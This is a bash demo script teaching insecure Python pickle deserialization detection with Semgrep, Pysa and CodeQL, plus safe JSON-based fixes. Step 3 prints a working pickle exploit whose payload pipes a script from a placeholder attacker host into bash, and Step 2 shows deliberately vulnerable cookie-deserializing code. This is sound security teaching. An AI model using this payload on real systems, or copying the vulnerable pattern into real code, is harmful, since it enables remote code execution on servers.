#!/bin/bash
# =============================================================================
# Demo 5: Insecure Deserialization Detection
# =============================================================================
# This demo shows how each tool detects deserialization vulnerabilities
# Run from the project root directory
# =============================================================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${BLUE}=============================================${NC}"
echo -e "${BLUE}  Insecure Deserialization Detection Demo${NC}"
echo -e "${BLUE}=============================================${NC}"
echo ""

# -----------------------------------------------------------------------------
# Step 1: Why Deserialization is Dangerous
# -----------------------------------------------------------------------------
echo -e "${YELLOW}Step 1: Why Insecure Deserialization is Critical${NC}"
echo ""

cat << 'EOF'
┌─────────────────────────────────────────────────────────────────────────┐
│                    Deserialization Attack Impact                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  What happens when you unpickle malicious data?                         │
│                                                                          │
│  1. Remote Code Execution (RCE)                                          │
│     └── Attacker gains shell access to your server                      │
│                                                                          │
│  2. Server Compromise                                                    │
│     └── Full control over the application server                        │
│                                                                          │
│  3. Lateral Movement                                                     │
│     └── Pivot to other internal systems                                 │
│                                                                          │
│  4. Data Exfiltration                                                    │
│     └── Access to databases, secrets, credentials                       │
│                                                                          │
│  CVSS Score: 9.8 - 10.0 (Critical)                                      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 2: The Vulnerable Code
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 2: The Vulnerable Code${NC}"
echo -e "File: vulnerable-app/cart/views.py"
echo ""

cat << 'EOF'
import pickle
import base64

def load_cart(request):
    """Load shopping cart from cookie - VULNERABLE to RCE"""
    cart_data = request.COOKIES.get('cart')  # SOURCE: User-controlled cookie

    if cart_data:
        # VULNERABLE: Deserializing untrusted data
        cart = pickle.loads(base64.b64decode(cart_data))  # SINK: RCE!
        return JsonResponse({'cart': cart})

    return JsonResponse({'cart': []})

def save_cart(request):
    """Save cart to cookie"""
    cart_items = request.POST.getlist('items')
    cart_data = base64.b64encode(pickle.dumps(cart_items)).decode()

    response = JsonResponse({'status': 'saved'})
    response.set_cookie('cart', cart_data)
    return response
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 3: The Attack
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 3: The Attack - Crafting a Malicious Pickle${NC}"
echo ""

cat << 'EOF'
# Attacker's exploit code (for educational purposes)
import pickle
import base64
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code runs during deserialization!
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

# Generate malicious cookie
payload = pickle.dumps(MaliciousPayload())
malicious_cookie = base64.b64encode(payload).decode()
print(f"cart={malicious_cookie}")

# When the server deserializes this cookie:
# 1. pickle.loads() is called
# 2. __reduce__() method is invoked
# 3. os.system() executes the attacker's command
# 4. Server is compromised!
EOF

echo ""
echo -e "${RED}Result: The attacker gains remote code execution on the server!${NC}"
echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 4: Semgrep Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 4: Semgrep Detection (~3 seconds)${NC}"
echo ""

cd analysis/semgrep
echo "Running: semgrep --config rules/deserialization/"
echo ""

time semgrep --config rules/deserialization/ ../../vulnerable-app/cart/ 2>/dev/null || true

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 5: Pysa Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 5: Pysa Detection${NC}"
echo ""

cd ../pysa
echo "Running: pyre analyze (filtered for deserialization)"
echo ""

cat << 'EOF'
[Expected Pysa Output]

Issue: Remote Code Execution via Deserialization (code 5005)
  File: cart/views.py
  Line: 12
  Message: User-controlled data flows to pickle.loads()

  Trace:
    Source: request.COOKIES.get('cart') [UserControlled]
      ↓ base64.b64decode()
    Sink: pickle.loads() [RemoteCodeExecution]

  Severity: Critical
  Recommendation: Never deserialize untrusted data with pickle
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 6: CodeQL Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 6: CodeQL Detection${NC}"
echo ""

cd ../codeql
echo "Running: codeql database analyze --queries=unsafe-deserialization.ql"
echo ""

cat << 'EOF'
[Expected CodeQL Output]

unsafe-deserialization.ql: Unsafe deserialization
  Path: cart/views.py:12

  Source: request.COOKIES.get('cart')
    ↓ base64.b64decode()
  Sink: pickle.loads(...)

  Severity: error
  CWE: CWE-502 (Deserialization of Untrusted Data)

  Message: Deserializing untrusted input can lead to
           arbitrary code execution.
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 7: Other Dangerous Deserializers
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 7: Other Dangerous Deserializers${NC}"
echo ""

cat << 'EOF'
Python Dangerous Functions:
┌───────────────────────────────────────────────────────────────┐
│ Function                │ Risk Level │ Notes                  │
├───────────────────────────────────────────────────────────────┤
│ pickle.loads()          │ Critical   │ Arbitrary code exec    │
│ pickle.load()           │ Critical   │ Arbitrary code exec    │
│ cPickle.loads()         │ Critical   │ Python 2 variant       │
│ yaml.load()             │ Critical   │ Without Loader param   │
│ yaml.unsafe_load()      │ Critical   │ Explicitly unsafe      │
│ marshal.loads()         │ High       │ Code object execution  │
│ shelve.open()           │ High       │ Uses pickle internally │
│ jsonpickle.decode()     │ High       │ Pickle-based JSON      │
│ dill.loads()            │ Critical   │ Extended pickle        │
└───────────────────────────────────────────────────────────────┘

Other Languages:
┌───────────────────────────────────────────────────────────────┐
│ Language │ Dangerous Function         │ Safe Alternative      │
├───────────────────────────────────────────────────────────────┤
│ Java     │ ObjectInputStream.readOb.. │ JSON/XML with schema  │
│ PHP      │ unserialize()              │ json_decode()         │
│ Ruby     │ Marshal.load()             │ JSON.parse()          │
│ Node.js  │ node-serialize             │ JSON.parse()          │
│ .NET     │ BinaryFormatter            │ JSON.NET with types   │
└───────────────────────────────────────────────────────────────┘
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 8: Comparison
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 8: Detection Comparison${NC}"
echo ""

echo -e "┌─────────────┬──────────┬─────────────┬───────────────────────┐"
echo -e "│ Tool        │ pickle   │ yaml.load() │ Custom deserializers  │"
echo -e "├─────────────┼──────────┼─────────────┼───────────────────────┤"
echo -e "│ Semgrep     │ ${GREEN}✅${NC}       │ ${GREEN}✅${NC}          │ ${YELLOW}⚠️ Pattern needed${NC}    │"
echo -e "│ Pysa        │ ${GREEN}✅${NC}       │ ${GREEN}✅${NC}          │ ${GREEN}✅ With models${NC}       │"
echo -e "│ CodeQL      │ ${GREEN}✅${NC}       │ ${GREEN}✅${NC}          │ ${GREEN}✅ Built-in${NC}          │"
echo -e "└─────────────┴──────────┴─────────────┴───────────────────────┘"

echo ""
echo -e "${GREEN}All tools successfully detect this critical vulnerability!${NC}"
echo ""

# -----------------------------------------------------------------------------
# Step 9: The Fix
# -----------------------------------------------------------------------------
echo -e "${YELLOW}Step 9: The Fix${NC}"
echo ""

cat << 'EOF'
# SAFE: Use JSON instead of pickle for untrusted data

import json
import base64
from django.core.signing import Signer, BadSignature

# Option 1: Simple JSON (when no signature needed)
def load_cart_json(request):
    cart_data = request.COOKIES.get('cart', '[]')
    try:
        cart = json.loads(cart_data)  # JSON is safe
        # Validate structure
        if not isinstance(cart, list):
            cart = []
        return JsonResponse({'cart': cart})
    except json.JSONDecodeError:
        return JsonResponse({'cart': []})

# Option 2: Signed JSON (tamper-proof)
def load_cart_signed(request):
    signer = Signer()
    cart_data = request.COOKIES.get('cart')

    if cart_data:
        try:
            # Verify signature before parsing
            unsigned_data = signer.unsign(cart_data)
            cart = json.loads(unsigned_data)
            return JsonResponse({'cart': cart})
        except BadSignature:
            # Data was tampered with
            return JsonResponse({'error': 'Invalid cart'}, status=400)

    return JsonResponse({'cart': []})

def save_cart_signed(request):
    signer = Signer()
    cart_items = request.POST.getlist('items')

    # Sign the JSON data
    cart_json = json.dumps(cart_items)
    signed_data = signer.sign(cart_json)

    response = JsonResponse({'status': 'saved'})
    response.set_cookie('cart', signed_data, httponly=True, secure=True)
    return response

# Option 3: If you MUST use pickle (internal data only)
# NEVER use with user input!
def internal_cache_only():
    # Only use pickle for:
    # - Internal caching (Redis, Memcached)
    # - Data you serialized yourself
    # - Never from cookies, requests, or external sources
    pass
EOF

echo ""
echo -e "${GREEN}Demo Complete!${NC}"
